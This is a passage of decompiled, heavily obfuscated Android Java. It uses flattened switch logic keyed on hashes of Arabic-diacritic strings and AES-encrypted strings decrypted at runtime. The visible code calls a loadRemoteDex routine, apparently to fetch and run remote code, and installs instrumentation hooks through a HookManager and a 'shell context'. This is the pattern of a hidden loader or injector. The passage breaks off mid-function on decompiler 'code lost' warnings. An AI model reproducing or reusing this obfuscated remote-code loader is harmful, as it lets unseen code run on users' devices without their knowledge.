                                                str79 = "ۢۘۨۘ۫ۤۥۥۖ۬ۥۚۜۘۚ۫ۚ۠ۥۖۘۧۡۖۘ۟ۙ۫ۢۦۨۘۧۤۢۨۢۗۛۘ۬";
                                            case 448178334:
                                                str78 = "ۘۗۚۜۚۖۘ۬۟ۖۘۛۘۥۘۥۦۖۤۛۚۖۜۘۦ۫ۥۜۗۗۖۚ۟ۗ۠ۡۘۦۜۦ";
                                                break;
                                            case 1866947238:
                                                str79 = i5 < jSONArrayOptJSONArray.length() ? "ۘۤۙۥ۫ۜۢۜۥۤ۫ۜۤۢۥۘۛ۠۠۬ۤۘۘ۟ۤۡۘ۠ۛۨۘۖ۫ۢۥ۬ۢۦۤۨۘۨۦۚۦۤۦۘ" : "ۖۤ۟ۛۚۙۧ۫ۖۢ۟ۡۘۚۥۡۘۡۦۨۘۤۤۧۜۡۘۗۢۤ۠ۙۡ";
                                        }
                                    }
                                    break;
                                case -573953181:
                                    str78 = "ۚۖۖۘ۠ۜۨۘۖۜۘۜ۬ۙۢۜ۟۫۫ۛۜۦۥۨ۫ۥۘ۟۟ۡۗۙۦ";
                                case -465611363:
                                    break;
                                case 1349320555:
                                    String str80 = "ۚۚۜۘ۫۬ۡۘ۟ۙۥۢۡۚۥۢۛۗ۠ۖۖۗۖۘۜ۟۬ۗۡۜۘ۫ۦۡۘۧۧۨۘۥۜۡۘۗ۬ۡۛۜ۠ۖۥۖۤۡۤ۠ۡۖۨ۫ۜۘ";
                                    while (true) {
                                        switch (str80.hashCode() ^ 2077459984) {
                                            case -1421785046:
                                                break;
                                            case -1135252952:
                                                String str81 = "۟ۤۤۚۦۙۚۗۨۧ۬ۚۘۢۜۘۜۖ۬ۖۧۥۘ۫۠ۗۨۧۡۘۖۡۘ";
                                                while (true) {
                                                    switch (str81.hashCode() ^ 1298901013) {
                                                        case -1787641244:
                                                            str81 = "ۘۗۨۘۗۥ۫ۚۧۧۨۢ۟ۚۙۛۜ۬ۙۡۥۨۗۥۨۖ۫۬ۙ۫ۡۘ";
                                                        case -1518623099:
                                                            str80 = "ۖۡۘۘ۟ۖۜۚۦۤۦ۬ۘۘۜۧۨۘ۠ۘۡۜۛۗۖۡۜۘۢۢۘۚۤۖۦ۬۫ۚۡ۠۫ۡۜۧ۟ۛ";
                                                            break;
                                                        case -588786895:
                                                            str80 = "ۥۥۘۖۚۥۤۨۘۛۖ۟ۥۥۘۚۤ۫ۢۨۢۧۢۥۡۗۖۡۚۤ۠ۧۘۘۗۗۖ";
                                                            break;
                                                        case 2059502872:
                                                            str81 = name.equals(jSONArrayOptJSONArray.optString(i5)) ? "۠ۚۖۗۥۤۙۤۥ۟۠۠۠ۢۧ۫۫ۦۘۜۛۥ۬ۥۨۘۘ۠ۡۘۦۛۢۖۜۨۢۖۦۘ" : "ۡۧۧۥۧ۬ۗۦ۬۫۠ۢۥۜ۬۟ۖۜۤۧ۬۫ۘۗۤۦۘۘۨۗۥۘ۫۬ۘۧۛۚۡۧۚ۬ۥ";
                                                    }
                                                }
                                                break;
                                            case 746225220:
                                                str80 = "۠۬ۨۘۙۚۦۚۨ۠ۛۜۤۚۥۡۘۚۤۥۥۙۧ۫ۡۥۧۥۢ۠ۘۘۦۤ۬ۨۗۨ۠ۦ۫ۧۦۙۛ۫ۚۚۖۦۘ";
                                            case 1764523345:
                                                activityECt8jHZ4.runOnUiThread(new p0(context, activityECt8jHZ4, 0));
                                                break;
                                        }
                                    }
                                    break;
                            }
                        }
                        i5++;
                    }
                    break;
                case 1240258644:
                    String str82 = "ۨۙۥۘۦۡۧۘۦۥ۫۠ۜۜۘۘۖۡۙۦۤۗۦۦۘۥۤۛۘۧۘ۟ۢۥۘ";
                    while (true) {
                        switch (str82.hashCode() ^ (-1454209623)) {
                            case -2140473979:
                                if (activityECt8jHZ4 == null) {
                                    str82 = "ۢۡۘۥۖۡۤ۬ۥۘۚۛۦۗۙ۬۫ۡۦۧۨۙۙۤ۫۫ۤۤۗۙ";
                                    break;
                                } else {
                                    str82 = "۬ۥۦۘۥ۠ۦۥۢۜۘۚ۬۫ۤۤ۬ۡۜۧۥۨۘۘۜ۫ۦۘۤۧۘۢۦ۬ۜۥۖۛۢۗ";
                                    break;
                                }
                            case -2051183709:
                                str77 = "ۤۛۢۗۚۨۛۖۨۘۙۥۡ۟ۧ۬ۜ۠ۗۜۚ۫۫۬ۜۜۜۥۤۥ۬ۘۡۘۖۚۙۜۘۜۧۜۦۘۡ۬ۥۘ۫ۖۢ۬ۙۨۦۚ۠";
                                continue;
                                continue;
                            case -825853229:
                                str82 = "ۢۖ۠ۖۗۖۨۚۦۘ۟ۗۙۤۥۧۘۖ۫ۛۥۛۡۧۦ۟ۤۜۧۚ۫ۗ۫ۜۡۘ۬ۗۗ۬ۡۧ۫ۢۛ";
                                break;
                            case 583761573:
                                str77 = "ۡۦۙۜۘۚۨۙۡۘۦۦۜۖۧ۬۠ۚۦۘۡۚۙۤۦۙۗۦۛۘۙۘۘۦۚۖۖۥۗۘ۟ۦۡۡۘۤۘۘۥۡۦۘۥ۬ۗۨۦۧۘ";
                                continue;
                        }
                    }
                    break;
                case 2050251165:
                    str77 = "ۗۢۖۘ۫ۖۨۘ۫۠ۡۦ۠ۖۜۖ۟۠ۤۜۘۛۦۗۢ۟ۚ۬۟ۚۚۘۧۦۘ۬ۤۧ۟ۜۗۘۘۘۥۧۘۘۘۗۨۚۖ۠ۛۖ۫";
                    continue;
                default:
                    continue;
            }
        }
        Activity activityECt8jHZ42 = Utils.ECt8jHZ4();
        String str83 = "ۗۗۘۙۘۚۘۦۨۘۙۘۖۘۤۛۜ۟ۜۜۤ۠ۧۙ۫ۚۨۚۖۘۢ۟ۖۘۢ۫ۘۘۜ۠ۖۘ";
        while (true) {
            switch (str83.hashCode() ^ 188738535) {
                case -2106635228:
                    activityECt8jHZ42.runOnUiThread(new p0(activityECt8jHZ42, context, 1));
                    break;
                case -1100115908:
                    String str84 = "ۤ۫ۘ۠ۡۘۘۤۥۘۦ۬ۦۘۦۧۢۥۖ۟ۘ۬۟۫ۗۜۘ۠ۤۡۘ۫۬ۖۘ";
                    while (true) {
                        switch (str84.hashCode() ^ 30504207) {
                            case -755529488:
                                str83 = "۠۫ۢۡ۬ۥ۫ۗۦۘۨۛۧ۟ۘۘۘۨۧ۠ۥۨۗۦۘۨۥ۫ۘۘ۫۠۠";
                                continue;
                            case -585047963:
                                str83 = "۟۟ۖۖۚۦۥ۠۬۠ۧۧۛۤۨۡۛ۬ۜۡۘۜ۟۟ۨۛۦ۬ۧۤۘۡۦۘۜۘۘۘۡۥ۫ۡ۟ۡۘ";
                                continue;
                                continue;
                            case 36074696:
                                if (!Utils.g(activityECt8jHZ42)) {
                                    str84 = "۬۫ۢ۫ۨۘۘ۟ۥۦۘۧۨۧۘ۬ۚ۠ۚۦۥۗ۟ۨۧۥۜۥۨۦۘۤۙ۠۬ۜ۟ۨۦۛۗۧۛۧ۫ۜۚۜۙۦۛۤۦۘۖۧۜ";
                                    break;
                                } else {
                                    str84 = "۟ۘۦۘۘۘۘۘۘۜۥ۟ۨۡۖ۬ۦۘۚۖۜ۬ۨۗۡۖ۠ۤ۫۫ۥۘ";
                                    break;
                                }
                            case 221373502:
                                str84 = "۟ۧۙ۬ۥ۫ۘۗۤۤۖۘۛۛۚۨۦۘۢ۬ۛۦۖۜۘۢۚۡۜۘ۬ۖۖۚۛۡ۟ۗۚۖ۟ۗ";
                                break;
                        }
                    }
                    break;
                case -73396823:
                    break;
                case 2088645503:
                    str83 = "ۛۢۘۘۨۘۧۘۨۛۛۙ۟ۜۘ۠ۢۛۡۗۚ۫ۨ۠۟ۛۚۢۘۧۘۚۢۡۘ۫۫۟ۘۖۧۘۖۜۙۖۜۜ";
                    continue;
                default:
                    continue;
            }
        }
        new Handler(Looper.getMainLooper()).post(new a(2));
        Utils.loadRemoteDex(context);
        sharedPreferences.edit().putString(e, strArr2[iArr[0]]).putInt(f, iArr2[0]).apply();
        a = false;
        String str85 = "ۧۨ۬۟ۥۥۘۖۙ۟ۘۤ۫۫ۖ۬ۥۘۧۚۧۖۧ۫ۘۤۜۥۡۡ۠";
        while (true) {
            switch (str85.hashCode() ^ 164306782) {
                case -1568868690:
                    JSONArray jSONArrayOptJSONArray3 = jSONObject.optJSONArray(l2.decrypt("NFPvsZqIkAQzQuE=\n", "WjaY0Pn8+XI=\n"));
                    String str86 = "ۥۚۖۘۢۤۜۘۢۦ۠ۤ۟ۖۛۨۡۨۢۘ۫ۜۛۗۗۤ۫ۙۥۘۦ۟ۢۗۧۨۘۦۗ";
                    while (true) {
                        switch (str86.hashCode() ^ 1238066457) {
                            case -714317864:
                                str86 = "ۚۢۦۖ۬ۙ۬ۧۚۜ۬ۤۡۛ۠ۘۡ۟ۨ۬ۢۙۜۢۚ۟ۛۚۡ۟ۦۚۙ۬ۨۜۚ۬ۥۨۖ۬ۦۘۙۢۦۨ۬ۤۗۜۘۙ";
                                continue;
                            case 269506931:
                                break;
                            case 1542737143:
                                String str87 = "۟۬ۨ۫ۨۢۚ۟ۥۘۙۨۥۜۥۜۘۙۧۧ۠ۙ۟ۜ۬ۖۖ۬ۚۥ۠ۧ۟ۤۨۘ۟ۚۤۢۦ۬ۗۚۥۤۜۘۦ۫ۛ";
                                while (true) {
                                    switch (str87.hashCode() ^ (-2103361595)) {
                                        case -595147855:
                                            break;
                                        case 447800857:
                                            String str88 = "۬ۙۨۘۛۨۥ۫ۤ۬ۚۢۚۖۙۙۜۤۙۖۤۦ۫ۨۥۘ۠ۨۡۢ۠ۡ";
                                            while (true) {
                                                switch (str88.hashCode() ^ 533989461) {
                                                    case -422756707:
                                                        str87 = "۬ۘۧۦۘۦۘۚ۫ۢۦۧۘۨۙۙ۠ۥۢۘۖۨۘۥ۟ۘۢۨۡۧۦۘ";
                                                        continue;
                                                    case 259134460:
                                                        str88 = "ۨۧۚۘ۠ۨۘ۟ۧ۫ۖۧۚۛۜۘۘۚۦۤۢۤۖۘۡۖۘ۫ۡ۠ۘۚۧ";
                                                        break;
                                                    case 509704200:
                                                        if (jSONArrayOptJSONArray3.length() <= 0) {
                                                            str88 = "ۡۥۗۗ۠ۜۘۙۘۤۡۖۙۨۜۥۘ۠ۤۨ۫ۥۨۚۥۨۘۦۦۤۘۛۢۚۨ۟ۚۡۢ";
                                                            break;
                                                        } else {
                                                            str88 = "ۧۡ۬۫ۡۘۢۨۜۤۡۥ۬۬ۜۙۧ۟ۛۤ۫ۘۘۡۘۤۘۡۘۖ۫ۥۨۤ۬ۥۙۘ۠ۗۚۜۛۢۛۛ۬ۚۤ۬ۘ۠ۢۖ";
                                                            break;
                                                        }
                                                    case 623628073:
                                                        str87 = "ۗ۠ۡۦۖۛۡۙۙۛ۟ۤۗۨۨۥۦۡۜۥۢۜۨۘۦۗۜۨ۫ۜ۫۟ۖ۟ۗ۫ۘۢۜ۟۟ۡۘۦۘ۟ۧۧۨۤۢۖ۟۠ۜۘ";
                                                        continue;
                                                        continue;
                                                }
                                            }
                                            break;
                                        case 1518862817:
                                            HookManager.hookInstrumentation(context);
                                            return;
                                        case 2013792475:
                                            str87 = "ۢۙۛۦ۠ۘۘ۠ۛۥۤۛۧۛۢۙ۫ۢۚ۫ۜۥۘ۟ۧ۬۠ۧ۟ۤ۟ۨۧۘۜۦۢ۟ۘ۟ۧۨۜۙۦ۬ۘ۬۠ۗۡۜۘۘ۬ۧ";
                                            continue;
                                        default:
                                            continue;
                                    }
                                }
                                break;
                            case 1543203480:
                                String str89 = "ۙۧۗ۟ۡۜۘۧۛۡۥۨۘۘۡۢۜۘۜۗۖۙ۫ۥۘۘۙ۠۠ۤۡۘ۬ۖۘ۬ۦ۟۠ۡۡ";
                                while (true) {
                                    switch (str89.hashCode() ^ (-1511580079)) {
                                        case -1908901716:
                                            str89 = "ۦۛ۫ۡ۠ۡۘۧۡۗۜۚۢ۫ۢۧ۠ۥۖۘۢۛۤۨۥۘۚۖۧۘۨ۠ۜۧ۠ۗ۬ۦۤ";
                                            break;
                                        case -1428333762:
                                            str86 = "ۦۧۚ۬ۚۥۘۜۥۘۛۙۙۗۡۘ۫ۙۨۘۖ۟ۖ۠ۗۖۘۙۛۛۜۥۘۥۧ۠ۜۥۜۘۤۡۧۘۡۧ";
                                            continue;
                                            continue;
                                        case -542322696:
                                            if (jSONArrayOptJSONArray3 == null) {
                                                str89 = "ۜۜۢۨۥۤۤۧۗۤۤۤۖۥۘۘۗۖۡۧۢۨ۠ۖۘ۟ۥ۬ۖۨۘۘۨۢۜۘ۟ۖ۠";
                                                break;
                                            } else {
                                                str89 = "ۡۡۤۢۗۖۘۨۖۖۘۗ۫ۙۤۨۘ۟ۤۜۨ۠ۜۦۜۥۘۙۧ۠ۛ۟ۡۘ";
                                                break;
                                            }
                                        case -476749377:
                                            str86 = "ۜۡۖۘۘۙۡۢۖۡۘۨۘۡۤۨۘۤ۫۠ۙۚۚۢۥۡ۫ۜۘۚۜۘ۬ۚۡۘۨ۫ۗ۬ۤۥۥ۫ۘۘ";
                                            continue;
                                    }
                                }
                                break;
                            default:
                                continue;
                        }
                    }
                    HookManager.initHooks(context);
                    return;
                case -349046193:
                    str85 = "ۡۙۤۚۦ۠۠ۜ۠ۤۚۧۡۢۙۜۧ۟۠ۘۦۘۚۖۥۛۖۘۘۜ۠ۖۘۦ۬ۘۢۜۖۘۤۤۚۦۢۧ";
                    break;
                case 738288422:
                    String str90 = "ۧۜۛۨ۠ۗۚۚۨ۫ۥۜۦۘۧۚۢۛۜۜۘ۠ۥۥۘۙۧ۟۠ۤۙ";
                    while (true) {
                        switch (str90.hashCode() ^ (-1735253292)) {
                            case -1893486633:
                                if (!jSONObject.optBoolean(l2.decrypt("52tv6mnWYdztbg==\n", "ggUOiAWzKbM=\n"), true)) {
                                    str90 = "ۥۤۚ۬ۛۧ۟ۦۘۘۨۖۖ۠ۥ۫ۧ۬ۙۨۚۥۜ۬ۘۦۘۤ۫ۡ۫ۧ۫۬۠ۘۘۧۖۡۘۖۥۦۘۤۗ۫ۡۙۖۘۛۗۛۨۤۛ";
                                    break;
                                } else {
                                    str90 = "۟ۡۧۖۘۡۤۢ۬۫ۜۚۙۢۦۛۚۘۖۦۦۤۨۥۘۖ۫ۨۚۜۚۖ۫ۖۘۙۙۥ";
                                    break;
                                }
                            case -1085493650:
                                str85 = "ۗۛۜۘ۬ۦۘۘۛۙ۫ۢ۠ۗ۬ۦۘ۟۫ۗۥ۠ۖۗۦۜۛۦۚۢۡ۬ۘۤۥۘۘۥ۠";
                                continue;
                            case 967312989:
                                str85 = "ۡۥۖۛۘۧۢۢۡۙۘۗۤ۬۬ۛ۠ۥۙۜ۠۬ۜ۫ۚ۫۟ۤۢۡۖ۟۠ۛۗۗۛۦۘ۬۟ۦۚۘۘ۟ۙۤۨۚۥۡۡ۬";
                                continue;
                            case 985881017:
                                str90 = "ۚۜۖۘۡۥۢ۠ۙۘۛۘۛۛۜۙۤۨۘۘۡۛۢۡۥۚۜۘۜۙۦۨ۟ۜۚۜۨۖۜۘۘ۫۫ۡۘۜۙۥ۠ۥۧۛۗۡۥۛۥۘ";
                                break;
                        }
                    }
                    break;
                case 939433455:
                    return;
            }
        }
    }

    public static String decrypt(String str, String str2) throws Exception {
        String str3 = "۫۫ۡۘ۟ۦ۠ۧۥۘۘ۫ۧۤ۫۟ۗ۟ۨۚۦۨۦۢۢۛۤۘۧ۟۬ۦۛۢۡۜۙۦ";
        Cipher cipher = null;
        SecretKeySpec secretKeySpec = null;
        IvParameterSpec ivParameterSpec = null;
        byte[] bArr = null;
        int length = 0;
        byte[] bArr2 = null;
        byte[] bArrDecode = null;
        while (true) {
            switch ((((str3.hashCode() ^ 565) ^ 483) ^ 201) ^ (-411773315)) {
                case -2067600674:
                    str3 = "ۥۥۜۘۙۗۗۙۚۚۦۛۥۘۘۡۡۘ۠۫ۘۘۜ۫ۜۘۡۚۢۢۘۖۘۚۛۨۙۤۥۤۛۜ";
                    break;
                case -1574434128:
                    System.arraycopy(bArrDecode, 0, bArr2, 0, 16);
                    str3 = "۠ۡۖۘۚ۟ۧ۫۬ۜۨۧۗ۟ۡۡۘ۫ۚۥ۟ۚۨۚۢ۬۟ۛۖۘۖۤۜۘ۠ۚۡۗۗۖۥۘ۠۟ۥۚ۬ۨ۬ۙۘۡ";
                    break;
                case -1527595414:
                    str3 = "ۚۤ۠ۨۥۖۘۖ۟ۢۙۜۖۤۜۡۗۤۖۡۖ۟۟۠ۘۡۤ۫ۡۙۨۘ۫ۡ۠ۖۡۚ";
                    length = bArrDecode.length - 16;
                    break;
                case -889317352:
                    str3 = "ۛ۬ۥۘۚ۠ۜۤۧۡۘ۬ۦ۫ۖۧۜۘۡۜۚۥ۠۠ۗۡۛۗۖۤۢ۠ۜۘۢۙۛۖۨۜۢۧۦۜۙ۬۬ۙۘ۠ۗۥۥۨۦۢۤ۬";
                    ivParameterSpec = new IvParameterSpec(bArr2);
                    break;
                case -17786080:
                    str3 = "ۥ۟ۥۥۜ۠۫۬ۜۥۚ۠ۨۥۜۘ۬ۧۚ۫ۖۥ۬ۗۨۙۛۤ۟ۖۦۘۤۚۜ۫ۙ۠";
                    break;
                case 165553129:
                    str3 = "ۧۧۘۡۗۛۢۖۡۥۖۙ۠ۦۨۘ۠۟ۧۜۗۥۢۘۧ۟ۖۘۦۙۙۨۜۥۘ۠ۚۜۦ۟ۚۤ۠ۢ۠ۥۢ۟ۡ۬ۖۢۨۘ۫ۡۡ";
                    bArrDecode = Base64.decode(str, 2);
                    break;
                case 1304516155:
                    str3 = "ۥ۫ۗ۬ۛۙۖۛۡۘ۬ۛۡۗۘۖۙ۠ۡ۫۠ۖۛ۟۫ۥۢ۫ۛۚۨۘۚۤۙۗۘۡۘۡۨۖۘۗۖ۬۬ۧۛۚۦۛۨ۬ۥ۬ۛ";
                    bArr = new byte[length];
                    break;
                case 1309035651:
                    return new String(cipher.doFinal(bArr), l2.decrypt("NhtIBew=\n", "Y08OKNTuzIs=\n"));
                case 1525114678:
                    cipher.init(2, secretKeySpec, ivParameterSpec);
                    str3 = "ۧۤۜ۫۫۠۟ۘۧۘۜۗۗۡۙ۠ۤۧۜۘۗۦۧۘ۠۟ۦ۫۬ۥۙۥۖۘ";
                    break;
                case 1819994022:
                    str3 = "ۧۤۨۘۡۨ۬ۖۚ۟ۦۙۨۘۡۥۜۘۘۗۢ۠ۛ۫ۥ۬ۘۡۗۗۡ۟ۡۘ۫۫ۗۘۥۤۧ۬ۧۡۚۤ۬ۤۨ۠ۜۘۘ";
                    secretKeySpec = new SecretKeySpec(str2.getBytes(l2.decrypt("ywiF6QM=\n", "nlzDxDuCS3w=\n")), l2.decrypt("5+WD\n", "pqDQw+IlvHA=\n"));
                    break;
                case 1832345933:
                    System.arraycopy(bArrDecode, 16, bArr, 0, length);
                    str3 = "ۘۗ۠ۛۛ۬۠۬ۜۘ۟ۖۦۢۢۤ۠ۖۛۤۨۚۥ۬ۗۤۥۢۚۖۧۖۜۧۚ";
                    break;
                case 1884610665:
                    cipher = Cipher.getInstance(l2.decrypt("0UJW+nVhN+jATEaGA3MVo/Rua7I=\n", "kAcF1TYjdMc=\n"));
                    str3 = "۟ۦۘۘۖۦۧ۠۟ۜ۠ۘۦۘۛ۠ۘۘ۠ۖۚۖۖۨۘۚۘۙ۟ۥۨۘۚۤۤۧۨۢۦۚ";
                    break;
                case 1932066426:
                    str3 = "ۖۧ۫ۤۡۤۢۗ۬۬ۦۡۘۨۡ۬ۘۧۖۘۢۜۖۘ۟ۘۖۘۤۦۡۘۙۙۖۢ۟ۖۘۦ۬۬ۨۦۘۚۚۢ";
                    bArr2 = new byte[16];
                    break;
            }
        }
    }

    public static JSONObject getJsonResult() {
        String str = "ۜ۬۠ۜۢۨۥ۬ۧۡۜۖۘۗۖۡۘۙۙۥۢ۟ۥۥۗۡۖۜۤ۟ۛۥۖۛۨۘۖۢۘۘۨ۠ۙۦۤۡۘ";
        while (true) {
            switch ((((str.hashCode() ^ 21) ^ FileUtils.FileMode.MODE_IRUSR) ^ 60) ^ 92278002) {
                case -1573455035:
                    return b;
                case 1136774148:
                    String str2 = "ۢ۬ۧۦ۬۠ۖ۟ۘۚ۬ۜۘۤۚۡۨ۫ۡۘۢ۟ۨ۟ۖۡۘۘۚۦ۫ۡۧۘۡ۟ۦۘ۫ۤۜۘ";
                    while (true) {
                        switch (str2.hashCode() ^ (-550277783)) {
                            case -2104810311:
                                str2 = "ۨ۬ۚۜۛۧ۟۬ۨۘ۬۟۟ۦۙۜۘۘۚۥۡۚۛۜ۟ۛۥۛۘۘ۟ۘۥۢۖۛۙۘۥ";
                                break;
                            case -879408331:
                                String str3 = "ۡۢۦۦۨۖۚ۬ۦۖۦۢۖۛۡۤ۬ۨۘۨۜۜۚۦۥۘ۫ۢۨۥۤۖۥۜۦۛ۠ۘۘۢۢ۬ۡ۫ۘۘۘۤ۬ۤۗۖ";
                                while (true) {
                                    switch (str3.hashCode() ^ (-468444924)) {
                                        case -1033231828:
                                            str3 = "ۨۨ۟ۦ۬ۥۘۧۚ۟ۥۡ۠ۦۚۘۘۛ۠ۗۛۨۧ۫ۛۧۨ۫ۡۗۥ۠۟ۛۥ۟ۖۗۨۖۖۚۧۚۤۘۧۘ۬ۚۦ";
                                        case 129294076:
                                            str2 = "۟ۙۡۙۘۥۡۡۛۡۦۖۗۛۦۘۥۨۜۘۢ۬ۤۚ۟ۨۛۢۥۦۥۘۖۖۧۘۨۧۘ۠ۖۡۦۥ";
                                            break;
                                        case 246378867:
                                            str2 = "ۙۦۨۘۧ۬ۨۘۡ۟ۖۘۢۖۧ۠ۖۨۘۙۦۦۘۘۤۚ۬۟ۗۘ۬ۢ۠۠ۨۘ";
                                            break;
                                        case 520322959:
                                            str3 = Utils.isRequest(VfSEUCNxUWTV.getShellContext()) ? "ۨۢ۠ۦۖۥ۫۠ۖۘۖۗۥۧۧۡۤۦۖۤ۠ۘ۬۫ۡۨ۬ۧۘ۬ۛۗۧۨۘ۫ۘۘۘ" : "ۢ۠ۦ۬ۢۦۘ۠ۨۥۢۦۥۘۘۤۡۥ۠ۖۘۜۚۢۖۦۜۘۚۖۦۘۧۦۗ۫ۨ۬ۢۥۡ";
                                    }
                                }
                                break;
                            case -80447:
                                str = "ۘۨۥۘۚۤ۟۟ۚۤ۫ۢ۫۟ۦۚۛۥۡۖۦۘۚ۟ۥۘۘۨۛۖۡۤۤۥۢۧۜۧۘۥۤ۠ۧ۟ۙ";
                                continue;
                            case 1179457419:
                                str = "ۚ۬ۥۘ۫ۦۜ۟ۜۛۦ۬۟ۛۖ۬ۗۧۜۘۤۥۤۘۘ۫ۦۦۚۜۙ۫ۨۧۘۘۜ۫ۖۘۨۢۧ۫۫ۖۦ۬۟";
                                continue;
                        }
                    }
                    break;
                case 1583448609:
                    return v0.getJsonResult();
            }
        }
    }

    public static boolean getisRequesting() {
        while (true) {
            switch (((("ۚ۠ۧۢۧۡۘ۬ۘۚۢۤۦۢۚۘۘ۬ۦۨۗۢۧۗۜۨۘ۠ۘۡۨۗۨ".hashCode() ^ 9) ^ 694) ^ 846) ^ 187281425) {
                case 1690899806:
                    return a;
            }
        }
    }

    public static boolean isDebug() {
        String str = "۟ۖۨۙۨۨۘۖ۟ۤۘ۫ۧۜۖۨۘۢۜ۬ۨۧۜ۫۟ۜۘ۫۫۬۠ۨۘۧ۟ۦۘ۟ۡۘ";
        while (true) {
            switch ((((str.hashCode() ^ 208) ^ 967) ^ 873) ^ (-1002762542)) {
                case 816931771:
                    return v0.isDebug();
                case 1650938478:
                    return c;
                case 1787741654:
                    String str2 = "ۡۧۦ۟ۜ۟ۨۘۦۘۤۢۦۘۨۧۗۧ۟ۥ۫ۥ۬ۥۦۘۧۢ۬۬ۖۗۘۡۨۙۤ";
                    while (true) {
                        switch (str2.hashCode() ^ (-591165357)) {
                            case -364695789:
                                String str3 = "ۢۢۜۦ۬۠ۜ۬ۛۡۗ۬ۘۗ۟ۘۘۘۘۧۡۘۧۦۙۨۢۡۚۖۜ۠۠۫ۘۘ۫ۗۖۛ۟۟۫";
                                while (true) {
                                    switch (str3.hashCode() ^ 89312359) {
                                        case -2058447389:
                                            str3 = "ۤۨۡۘ۫۠ۗۦۗۥۘۚۨ۟ۡۛۥۢ۫۫ۨۘۥۙۘۢۡۙۘۗۧۙۡ۟ۦۘۤۖۨۘۤۦ۫ۘۖۧۘ";
                                        case -1635873451:
                                            str2 = "ۧ۫۠ۗۛۜۘ۫ۛۙ۟ۖۛۘۘۘۛۥ۬ۖۧۢ۟ۦۚۨۖۧۗۢۘۤۚۡ۟ۧۚ";
                                            break;
                                        case -1351041973:
                                            str2 = "ۢ۫ۙ۟۫ۡۖۦ۬ۛۛ۫ۚۙۨۡ۟ۨۘ۫ۨۛۖۤۖۘۥۗۨۘۢۦۖۘۛۜۨۘۨۡ۠ۦۢۜۘۙۘۦ۬ۙۚۥۤۡۢۛۨۥۡۦ";
                                            break;
                                        case 1641548508:
                                            str3 = Utils.isRequest(VfSEUCNxUWTV.getShellContext()) ? "ۜۤ۫۫ۤۜ۟ۙۦۘۜۘۢۧۖۦۘۘ۬ۨۙۜۖۘ۫ۗۘۘ۠ۘ۬ۘ۠ۚۛۜۧۚ۟ۚۨۡۛۢۨۡۘۛ۫۟۠ۙۢۨۚۤ۬۠" : "ۛۜۛۢۦۘۘ۠ۛۨۡۥۥۘۡۦ۫ۨۢۢ۬ۖۚۜۧۛۥۧۘۘۖۥۥۘ";
                                    }
                                }
                                break;
                            case 461932685:
                                str2 = "ۘۚۖۘۜۛ۟ۢۨۘۧۙۚۤۦۥ۫ۖۜۢۤۢۘ۟ۥ۫ۦۖۘۡ۠ۖۘۢ۠ۘۨۗۦۘ";
                                break;
                            case 713869519:
                                str = "ۢۗ۫ۤۡۙۢۜۥ۠۬ۛ۫۬ۢۖۘۧۜۢ۬۫۫ۨۘۤۦ۫ۦۨۧۘۚۧۖۘ۟ۘۘۘۢۙۦۘ۟ۜ";
                                continue;
                            case 2054366188:
                                str = "ۢۚۤۥۛۙ۟۟۬ۜۗۛۛۡۘۡۧۥۦۚۘۘۧۚۛۗ۬۫ۨۦۢۗۧۜ۫ۛ۠ۥۧۘۘۡ۟ۢ۫ۙۛۙۡۘ";
                                continue;
                        }
                    }
                    break;
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:150:0x02ae, code lost:
    
        r1 = "ۡ۟ۧ۟۫ۥۡۨۨۘۤۙۢۢۜۙۡۤ۠ۛۗۗۤۢۤۘۖۖۘۦۦۘۖۨۚۘۘ۟ۛۥۜۘۦ۫۬ۚ۬۫ۛۨ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:152:0x02b8, code lost:
    
        switch((r1.hashCode() ^ (-1909568420))) {
            case -1119717595: goto L723;
            case -410083207: goto L780;
            case -402585243: goto L781;
            case 735588557: goto L779;
            default: goto L785;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:154:0x02bc, code lost:
    
        r1 = "ۢۤۙۗ۬ۘۥۤ۬ۜۦۡۘ۬۬ۥۘۧ۬ۦ۠ۘۘۚۦۘۡۜ۟ۡۛۧۛۙ۠ۗۜۦۘۦۤ۠ۗۖۘ۟ۢۚۨۨ۫۟ۛۦۡ۬۫";
     */
    /* JADX WARN: Code restructure failed: missing block: B:183:0x0314, code lost:
    
        r1 = "ۜ۟ۘۘۦۗۥۚۙۥۘۦۧۘۛۖۖۘۛۗۖۘۙ۟ۘۘۚۤۦۛۚۥۘۨ۬ۛۧۧ۫ۨۘۡۖۚۗۛۘۘۡۚ۬ۤۦۘۚۚۖۢۚۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:184:0x0317, code lost:
    
        r1 = "۟ۚۨۜۤۘۘۖۢۥۘ۠۫ۢۚ۟۫۟۟۬ۘ۟۫ۢ۬ۤۙۖۘۘۦۗۥۘۦۚۘۡۘۤۦۦۧۘ۬ۢۢ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:186:0x0321, code lost:
    
        switch((r1.hashCode() ^ 242301850)) {
            case 199032186: goto L782;
            case 545042024: goto L790;
            case 823278677: goto L789;
            case 2054637643: goto L783;
            default: goto L794;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:188:0x0325, code lost:
    
        r1 = "ۘۚۡۚۜۧۖۛۥۘۖۜۢۙۖ۫ۤۜۚۙ۬ۚۦۤۘۘۛۜ۠۬ۙۚ۬ۥۘۡۧۤ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:189:0x0328, code lost:
    
        r1 = "۬ۜۗۛۦۨۘۖ۬۫ۛ۠ۜۧۙۙۛۙۗۥۥۛۙ۫ۚۤۥۚۢۥۘۦۗۜۧۗۜۘ۬۫۫ۜۢ۠ۤۢۦۙ۠ۚ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:191:0x032c, code lost:
    
        if (r8 != 1) goto L792;
     */
    /* JADX WARN: Code restructure failed: missing block: B:192:0x032e, code lost:
    
        r1 = "ۛۢۘۘۖۥۧۛۢ۟ۧۜۥۘۖۙۛۧۘۗۘۥۘۤۜۦۧ۠ۛۡ۟ۚ۟ۦ۠ۖۘۗۧۧۨ۬۫ۤۖۘۘۥۘۥ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:193:0x0331, code lost:
    
        r1 = "ۦۜۖۨۛۘۘۚۦۦۨۤ۠۫۠ۡۜۖۘۖ۟ۜۘۘ۠ۚۢۤۧۘۙۤ۫ۧۧۘۗۗ۫ۙۡۘۢۧۦۘۥ۫ۗۨۛۦۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:194:0x0334, code lost:
    
